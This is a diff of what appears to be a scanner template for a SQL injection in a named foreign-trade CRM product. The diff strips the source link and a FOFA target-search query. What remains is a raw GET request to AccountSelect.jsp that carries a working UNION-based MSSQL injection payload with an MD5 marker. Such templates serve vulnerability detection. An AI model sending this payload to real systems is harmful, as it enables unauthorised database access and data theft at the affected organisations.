@@ -3,12 +3,8 @@ info:
   name: 维达外贸客户关系管理系统AccountSelect存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gi32thtofl6kzng6'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gi32thtofl6kzng6
-    fofa: title="维达外贸客户关系管理系统"
 http:
 - raw:
   - 'GET /wap/common/AccountSelect.jsp?ids=1%29+UNION+ALL+SELECT+NULL%2CNULL%2CCHAR%28126%29%2Bsys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%271%27))%2BCHAR%28126%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+x&returnType=11 HTTP/1.1
